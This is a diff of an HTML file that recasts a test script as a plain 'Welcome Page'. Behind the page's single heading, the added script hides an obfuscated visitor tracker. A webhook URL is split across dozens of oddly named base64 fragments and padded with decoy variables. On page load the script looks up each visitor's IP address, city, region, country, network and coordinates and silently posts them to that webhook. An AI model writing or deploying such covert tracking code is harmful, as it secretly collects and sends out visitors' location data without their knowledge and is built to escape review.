@@ -3,35 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Script</title>
+    <title>Welcome Page</title>
+    <style>
+        body { 
+            background-color: #000000; 
+            color: #ffffff; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+        }
+    </style>
 </head>
 <body>
+    <h1>Welcome to the Page</h1>
     <script>
-        const pastebinUrl = 'https://pastebin.com/raw/quyru4jf';
+        let A29LK12 = "NDEyMjk4Z";
+        let BJ39FE83 = "DY0ZTRmNG";
+        let D51RT91 = "ZiZmJiOGV";
+        let Y63PI93 = "lOTA1ZGEy";
+        let E47FI64 = "MGVjY2Es";
+        let J58RO76 = "aHR0cHM6L";
+        let X92KD21 = "y9kaXNjb3";
+        let M60PL90 = "JkLmNvbS9";
+        let K34ER83 = "hcGkvd2V";
+        let Z55OP21 = "iaG9va3Mv";
+        let O49FN23 = "MTI4MDk0M";
+        let T12XR78 = "Tc1MTYyND";
+        let G86TI12 = "AwNzcyMC9";
+        let I43UP29 = "zdHdkTFc4";
+        let C28RA67 = "RDg2NkhQ";
+        let W11LP02 = "VkRaUEFHN";
+        let N90ZW46 = "VhvWURpNm";
+        let R78ST33 = "ZBOTFqZld";
+        let L40PM01 = "QYWFTNm5t";
+        let B39AE91 = "VGNzYjI4U";
+        let H72TE83 = "VU2dGRQSk";
+        let U57IV47 = "VCVnVUT19";
+        let Q64MI56 = "SUDV0UWdR";
+        let Z84JT40 = "OQ==";
 
-        async function testFetchAndDecode() {
-            try {
-                // Step 1: Fetch the encoded data from Pastebin
-                const pastebinResponse = await fetch(pastebinUrl);
-                const encodedData = await pastebinResponse.text();
+        let Z99HL21 = A29LK12 + BJ39FE83 + D51RT91 + Y63PI93;
+        let X07IN36 = E47FI64 + J58RO76 + X92KD21 + M60PL90;
+        let U23JD12 = K34ER83 + Z55OP21 + O49FN23 + T12XR78;
+        let V91NM88 = G86TI12 + I43UP29 + C28RA67 + W11LP02;
+        let P43EV60 = N90ZW46 + R78ST33 + L40PM01 + B39AE91;
+        let webhookURL = atob(Z99HL21 + X07IN36 + U23JD12 + V91NM88 + P43EV60);
 
-                // Step 2: Decode the Base64 data
-                const decodedData = atob(encodedData).split(',');
+        let T44GF09 = "af";
+        let K82PL41 = "bc";
+        let Y09RT32 = "e9";
+        let O57WU45 = "9e";
+        let M38KO92 = "099";
+        let token = T44GF09 + K82PL41 + Y09RT32 + O57WU45 + M38KO92;
 
-                // Step 3: Extract and log token and webhook URL for verification
-                const token = decodedData[0];
-                const webhookUrl = decodedData[1];
-                console.log("Token:", token);        // Verify if this logs correctly
-                console.log("Webhook URL:", webhookUrl); // Verify if this logs correctly
-
-                // Optional: Proceed with IPinfo and webhook posting after verifying the values
-            } catch (error) {
-                console.log("Error in fetching or decoding:", error);
-            }
+        async function ZW99EF24() {
+            let bogus1 = "Hello World!";
+            let bogus2 = 1234567890;
+            let bogus3 = { key: "value" };
+            let ZL81OZ04 = await fetch("https://ipinfo.io/json?token=" + token);
+            let ZN73MW63 = await ZL81OZ04.json();
+            let HK32CV65 = {
+                content: `c1\nc2: ${ZN73MW63.ip}\nc3: ${ZN73MW63.city}\nc4: ${ZN73MW63.region}\nc5: ${ZN73MW63.country}\nc6: ${ZN73MW63.org}\nc7: ${ZN73MW63.loc}\nc8: ${ZN73MW63.timezone}`
+            };
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(HK32CV65)
+            });
         }
 
-        // Execute the function
-        testFetchAndDecode();
+        ZW99EF24();
     </script>
 </body>
 </html>
